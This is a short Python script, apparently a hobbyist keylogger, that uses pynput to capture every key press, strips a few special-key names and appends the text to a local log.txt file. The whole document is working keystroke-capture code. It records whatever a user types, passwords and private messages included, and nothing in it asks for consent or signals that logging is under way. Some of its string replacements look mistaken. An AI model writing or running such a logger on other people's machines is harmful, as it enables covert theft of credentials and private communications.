from pynput.keyboard import Listener as keyb
# from pynput.mouse import Listener as chuha

def savetext(key):
    record=str(key)
    record=record.replace("backspaceKey.","")
    record=record.replace("backspaceiKey.","")
    record=record.replace("'","")
    record=record.replace("Key.shift","")
    record=record.replace("Key.space"," ")
    record=record.replace("Key.caps_lock"," caps:")

    with open("log.txt","a") as f:
        f.write(record)

with keyb(on_press=savetext) as k:
    k.join()